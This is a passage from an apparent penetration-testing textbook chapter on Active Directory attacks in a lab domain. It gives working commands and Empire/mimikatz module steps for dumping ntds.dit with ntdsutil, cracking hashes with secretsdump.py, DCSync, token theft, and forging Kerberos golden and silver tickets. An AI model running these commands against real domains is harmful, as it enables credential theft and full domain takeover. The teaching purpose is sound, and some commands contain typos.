    <p class="normal">This will invoke the domain controller so it becomes an agent to the listener. Once the agent is reported back to the Empire tool, we can change the agent to the newly reported computer by running <code class="inlineCode">interact &lt;Name&gt;</code>. Then, using the <code class="inlineCode">management/enable_rdp</code> module<a id="_idIndexMarker1346"/> will enable <strong class="keyWord">remote desktop protocol</strong> (<strong class="keyWord">RDP</strong>) on the domain controller.</p>
    <p class="normal">We have to locate the entire registry of SECURITY and SYSTEM, and it is crucial to use <code class="inlineCode">ntds.dit</code>. This can be performed by a single PowerShell command utilizing <code class="inlineCode">ntdsutil</code>:</p>
    <pre class="programlisting con"><code class="hljs-con">ntdsutil "ac I ntds" "ifm" "create full c:\temp" q q
</code></pre>
    <p class="normal">What does the preceding command do?</p>
    <p class="normal"><code class="inlineCode">ntdsutil</code> is a command-line utility built<a id="_idIndexMarker1347"/> into the Windows Server family that enables the management of Active Directory domain services. </p>
    <p class="normal">This utility, <strong class="keyWord">Install from Media </strong>(<strong class="keyWord">IFM</strong>), helps us to download all the Active Directory database<a id="_idIndexMarker1348"/> and registry settings from the domain controller to flat files, as shown in <em class="italic">Figure 12.38</em>. Finally, we can see these files at <code class="inlineCode">c:\temp</code> with two folders, <code class="inlineCode">Active Directory</code> and <code class="inlineCode">registry</code>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_38.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.38: Manually creating the NTDS snapshots</p>
    <p class="normal">Now both the registry and system hive have been created in the <code class="inlineCode">c:\temp</code> folder, which can be utilized for offline password cracking using <code class="inlineCode">secretsdump.py</code>.</p>
    <p class="normal"><code class="inlineCode">secretsdump.py</code> is an in-built script within Kali Linux from Impacket. To see plaintext and hashed passwords, attackers can run <code class="inlineCode">secretsdump.py -system &lt;systemregistry&gt; -security &lt;securityregistry&gt; -ntds &lt;location of ntds&gt; "LOCAL"</code> in the terminal. All Active Directory usernames and their password hashes must be visible to attackers.</p>
    <p class="normal">Similarly, if the objective<a id="_idIndexMarker1349"/> is to extract only a domain hash dump, attackers can utilize<a id="_idIndexMarker1350"/> the agent running on the domain controller and run the <code class="inlineCode">credentials/Mimikatz/dcysnc_hashdump </code>module, which will run directly on the domain controller to extract only the username and password hashes of all domain users, as shown in <em class="italic">Figure 12.39</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_12_39.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.39: Output of the DCSync Hashdump module</p>
    <h1 id="_idParaDest-294" class="heading-1">Compromising Kerberos – a golden-ticket attack</h1>
    <p class="normal">Another set of more sophisticated (and more recent) attacks is the abuse of Microsoft Kerberos vulnerabilities in an Active Directory environment. A successful attack leads to attackers compromising<a id="_idIndexMarker1351"/> domain controllers and then escalating the privilege to the enterprise<a id="_idIndexMarker1352"/> admin and schema admin level using the Kerberos implementation.</p>
    <p class="normal">The following are typical steps when a user logs on with a username and password in a Kerberos-based environment:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">The user’s password is converted into an NTLM hash<a id="_idIndexMarker1353"/> with a timestamp and then it is sent over to the <strong class="keyWord">Key Distribution Center</strong> (<strong class="keyWord">KDC</strong>).</li>
      <li class="numberedList">The domain controller<a id="_idIndexMarker1354"/> checks the user information and creates a <strong class="keyWord">Ticket-Granting Ticket</strong> (<strong class="keyWord">TGT</strong>).</li>
      <li class="numberedList">This Kerberos TGT can only be accessed by the Kerberos service (KRBTGT).</li>
      <li class="numberedList">The TGT is then passed<a id="_idIndexMarker1355"/> on to the domain controller from the user to request a <strong class="keyWord">Ticket Granting Service</strong> (<strong class="keyWord">TGS</strong>) ticket.</li>
      <li class="numberedList">The domain controller validates the <strong class="keyWord">Privileged Account Certificate</strong> (<strong class="keyWord">PAC</strong>). If it is allowed to open<a id="_idIndexMarker1356"/> the ticket, then the TGT is effectively copied to create the TGS.</li>
      <li class="numberedList">Finally, the service is granted for the user to access the services.</li>
    </ol>
    <p class="normal">Attackers can manipulate these Kerberos tickets based on the password hashes that are available. For example, if you have already compromised a system that is connected to a domain and extracted the local user credentials and password hashes, the next step is to identify the KRBTGT password hash to generate a golden ticket; this will make it a little difficult for the forensics and incident response teams to identify the origin of the attack.</p>
    <p class="normal">In this section, we will explore how easy it is to generate a golden ticket. We can exploit the vulnerability in just a single step by utilizing the Empire tool, assuming we have a domain-connected computer with a normal domain user with local admin privileges on that computer.</p>
    <p class="normal">All Active Directory controllers are responsible for handling Kerberos ticket requests, which are then used to authenticate the domain users. The <code class="inlineCode">krbtgt</code> user account is used to encrypt and sign all the Kerberos tickets generated within a given domain and then the domain controllers use this account’s password to decrypt the Kerberos tickets for a chain of validation. Pentesters must remember that most service accounts, including <code class="inlineCode">krbtgt</code>, are not subject to password expiry or password changes and the account name is usually the same.</p>
    <p class="normal">We will use the low-privileged domain<a id="_idIndexMarker1357"/> user with local admin access to generate the token, pass the hash<a id="_idIndexMarker1358"/> to the domain controller, and generate the hash for the specified account. This can be achieved with the following steps:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">List all the credentials harvested in the Empire tool by running the <code class="inlineCode">credentials</code> command; If we do not see <code class="inlineCode">krbtgt</code>, then we will utilize the agent that is running on the domain controller to get the hash value. In this case, we will run CrackMapExec on the domain controller using <code class="inlineCode">exchangeadmin</code> as the value and interact with the agent. </li>
      <li class="numberedList">The next step is to identify a process<a id="_idIndexMarker1359"/> that is running as privilege-level, steal the token, and run<a id="_idIndexMarker1360"/> a further command with the use of the <code class="inlineCode">steal_token PID</code> command in the Empire tool, as shown in <em class="italic">Figure 12.40</em>:<figure class="mediaobject"><img src="../Images/B17765_12_40.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.40: Stealing a session token of a high-privilege user</p>
      </li>
      <li class="numberedList">Now we are set to run as Administrator from the domain controller that is running the <code class="inlineCode">mastering.kali.fourthedition</code> domain. The output should include the domain SID and the necessary password hash:
        <pre class="programlisting con"><code class="hljs-con">usemodule credentials/Mimikatz/dcysnc
set domain mastering.kali.fourthedition
set username krbtgt
run
</code></pre>
        <figure class="mediaobject"><img src="../Images/B17765_12_41.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.41: Output of DCSync and successfully capturing the password hash of krbtgt</p>
      </li>
      <li class="numberedList">By now, we should<a id="_idIndexMarker1361"/> have stolen the <code class="inlineCode">krbtgt</code> user account password<a id="_idIndexMarker1362"/> hash, if the domain controller is vulnerable. Attackers should do the same across all the domain controllers if DCSync failed, and they should be able to see the new credential added to the existing list with the username <code class="inlineCode">krbtgt</code>:<figure class="mediaobject"><img src="../Images/B17765_12_42.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.42: Validating the hash value of krbtgt in PowerShell Empire</p>
      </li>
      <li class="numberedList">Finally, when we get the Kerberos hash, this hash can be passed to the domain controller to issue a golden ticket. Now we can utilize the low-privileged user, <code class="inlineCode">normaluser</code>, and run the <code class="inlineCode">golden_ticket</code> module with the right credential ID<a id="_idIndexMarker1363"/> and any username for the module. When the module<a id="_idIndexMarker1364"/> is successfully executed, you should be able to see a message as shown in the following screenshot and run the golden ticket module with any user you like:
        <pre class="programlisting con"><code class="hljs-con">usemodule credentials/mimikatz/golden_ticket
set user Cred ID
set user IDONTEXIST
execute
</code></pre>
      </li>
      <li class="numberedList">Successful execution of the module should provide us with the details shown in <em class="italic">Figure 12.43</em>: <figure class="mediaobject"><img src="../Images/B17765_12_43.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.43: Creating the golden ticket using krbtgt and an invalid user</p>
      </li>
      <li class="numberedList">And attackers can validate<a id="_idIndexMarker1365"/> the generated Kerberos ticket using <code class="inlineCode">klist</code> whether the ticket<a id="_idIndexMarker1366"/> generated is in the session or not, as seen in <em class="italic">Figure 12.44</em>: <figure class="mediaobject"><img src="../Images/B17765_12_44.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.44: Validating the cached tickets on the target machine</p>
      </li>
      <li class="numberedList">With the golden<a id="_idIndexMarker1367"/> ticket, the attacker should be able to view any files on the domain<a id="_idIndexMarker1368"/> controller as follows, or any system on the domain with this golden ticket, and exfiltrate data:<figure class="mediaobject"><img src="../Images/B17765_12_45.png" alt=""/></figure>
        <p class="packt_figref">Figure 12.45: Successful exploitation of the golden ticket attack</p>
      </li>
    </ol>
    <p class="normal">This can also be achieved by running the following from <code class="inlineCode">mimikatz</code> on the compromised system, if the attacker has a remote desktop session on the target domain controller, with the following command:</p>
    <pre class="programlisting con"><code class="hljs-con">kerberoserberos::golden /admin:Administrator /domain:Mastering.kali.fourthedition /id:ACCOUNTID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
</code></pre>
    <p class="normal">By running this, attackers<a id="_idIndexMarker1369"/> get authenticated as any user, even a non-existing user, including the enterprise-administrator<a id="_idIndexMarker1370"/> and schema-administrator levels. Within the same ticket, attackers can also perform DCSync using Mimikatz, as seen in <em class="italic">Figure 12.46</em>: </p>
    <pre class="programlisting con"><code class="hljs-con">Lsadump::dcsync /domain:mastering.kali.fourthedition /all /csv
</code></pre>
    <figure class="mediaobject"><img src="../Images/B17765_12_46.png" alt=""/></figure>
    <p class="packt_figref">Figure 12.46: Performing DCSync using Mimikatz on a low-privilege user using the golden ticket</p>
    <p class="normal">One more similar attack<a id="_idIndexMarker1371"/> is the Kerberos silver-ticket attack, which is not talked<a id="_idIndexMarker1372"/> about much. This attack again forges the TGS, but it is signed by a service account; this means<a id="_idIndexMarker1373"/> the silver-ticket attack is limited to whatever service is directed<a id="_idIndexMarker1374"/> on the server. The PowerShell Empire tool can be utilized to exploit the same vulnerability using the <code class="inlineCode">credentials/mimikatz/silver_ticket</code> module by providing the <code class="inlineCode">rc4/NTLM</code> hash to the parameters.</p>
    <h1 id="_idParaDest-295" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we looked at the methodology of escalating privileges and explored different methods and tools that can be utilized to achieve our penetration test goal.</p>
    <p class="normal">We first started with common system-level privilege escalation by exploiting <code class="inlineCode">ms18_8120_win32k_privesc</code> on Windows Server 2008 and using <code class="inlineCode">bypassuac_fodhelper</code> on Windows 10 machines. We focused on utilizing Meterpreter to gain system-level control and later we took a detailed look at utilizing the Empire tool; then we harvested credentials by using password sniffers on the network. We also utilized Responder and performed NTLM relay attacks to gain remote system access, and we used Responder to capture the passwords of different systems on a network that utilizes SMB.</p>
    <p class="normal">We completely compromised an Active Directory using a structured approach. Finally, we exploited access rights in Active Directory by using PowerShell Empire and a compromised Kerberos account and performed a golden-ticket attack utilizing the Empire tool.</p>
    <p class="normal">In the next chapter (<em class="chapterRef">Chapter 13</em>, <em class="italic">Command and Control</em>), we will learn how attackers use different techniques to maintain access to a compromised system in line with the cyber kill chain methodology. We will also delve into how to exfiltrate data from internal systems to external systems.</p>
  </div>
</body></html>